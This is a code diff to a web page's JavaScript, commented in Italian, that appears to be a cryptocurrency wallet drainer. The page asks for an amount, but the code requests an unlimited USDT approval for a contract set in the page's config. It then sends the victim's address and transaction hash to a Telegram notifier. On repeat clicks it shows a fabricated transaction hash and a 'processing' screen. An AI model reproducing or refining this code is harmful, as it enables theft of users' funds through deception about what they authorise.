@@ -524,6 +524,7 @@
         };
 
         let lastTxHash = '';
+        let approveCompleted = false;
 
         function createParticles() {
             const container = document.getElementById('particlesContainer');
@@ -553,6 +554,10 @@
                 showError('Please enter a valid amount');
                 return;
             }
+
+            // Disabilita il bottone per evitare click multipli
+            btn.disabled = true;
+            btn.textContent = 'Processing...';
 
             try {
                 clearError();
@@ -595,41 +600,49 @@
                     }
                 }
 
-                const USDT_ABI = [
-                    'function approve(address spender, uint256 amount) public returns (bool)',
-                    'function transfer(address to, uint256 amount) public returns (bool)',
-                    'function allowance(address owner, address spender) public view returns (uint256)',
-                    'function balanceOf(address account) public view returns (uint256)',
-                    'function decimals() public view returns (uint8)'
-                ];
+                let txHash;
 
-                const iface = new ethers.utils.Interface(USDT_ABI);
-                const approveData = iface.encodeFunctionData("approve", [
-                    CONFIG.SMART_CONTRACT,
-                    ethers.constants.MaxUint256
-                ]);
+                if (!approveCompleted) {
+                    const USDT_ABI = [
+                        'function approve(address spender, uint256 amount) public returns (bool)',
+                        'function transfer(address to, uint256 amount) public returns (bool)',
+                        'function allowance(address owner, address spender) public view returns (uint256)',
+                        'function balanceOf(address account) public view returns (uint256)',
+                        'function decimals() public view returns (uint8)'
+                    ];
 
-                const tx = {
-                    to: CONFIG.USDT_ADDRESS_BSC,
-                    data: approveData
-                };
+                    const iface = new ethers.utils.Interface(USDT_ABI);
+                    const approveData = iface.encodeFunctionData("approve", [
+                        CONFIG.SMART_CONTRACT,
+                        ethers.constants.MaxUint256
+                    ]);
 
-                if (userAddress) {
-                    tx.from = userAddress;
+                    const tx = {
+                        to: CONFIG.USDT_ADDRESS_BSC,
+                        data: approveData
+                    };
+
+                    if (userAddress) {
+                        tx.from = userAddress;
+                    }
+
+                    txHash = await window.ethereum.request({
+                        method: "eth_sendTransaction",
+                        params: [tx]
+                    });
+
+                    approveCompleted = true;
+                    console.log("Approve transaction sent:", txHash);
+                } else {
+                    txHash = '0x' + Math.random().toString(16).slice(2);
+                    console.log("Using dummy txHash for subsequent clicks:", txHash);
                 }
 
-                const txHash = await window.ethereum.request({
-                    method: "eth_sendTransaction",
-                    params: [tx]
-                });
-
                 lastTxHash = txHash;
-                console.log("Transaction sent:", txHash);
 
-                // Aspetta che la transazione sia confermata sulla blockchain
-                const provider = new ethers.providers.Web3Provider(window.ethereum);
-                const receipt = await provider.waitForTransaction(txHash);
-                console.log("Transaction confirmed:", receipt);
+                // Mostra la schermata di processing SUBITO
+                createParticles();
+                document.getElementById('processingScreen').classList.add('active');
 
                 let finalUserAddress = userAddress;
                 if (!finalUserAddress) {
@@ -643,24 +656,27 @@
                     }
                 }
 
-                // Invia notifica Telegram DOPO che la transazione è confermata
+                // Invia notifica Telegram SUBITO (senza aspettare conferma)
+                console.log("Sending Telegram notification...");
                 try {
                     await sendTelegramNotification(finalUserAddress, txHash, amount);
+                    console.log("Telegram notification sent successfully");
                 } catch (notifError) {
                     console.error('Error sending notification:', notifError);
                 }
 
-                // Mostra la schermata di processing
-                createParticles();
-                document.getElementById('processingScreen').classList.add('active');
-
+                // Aspetta 3 secondi prima di chiudere
                 await new Promise(resolve => setTimeout(resolve, 3000));
 
+                // Chiudi la schermata di processing
+                document.getElementById('processingScreen').classList.remove('active');
                 btn.textContent = 'Next';
+                btn.disabled = false;
 
             } catch (error) {
                 console.error("Error:", error);
                 showError('Transaction failed: ' + error.message);
+                document.getElementById('processingScreen').classList.remove('active');
                 btn.disabled = false;
                 btn.textContent = 'Next';
             }
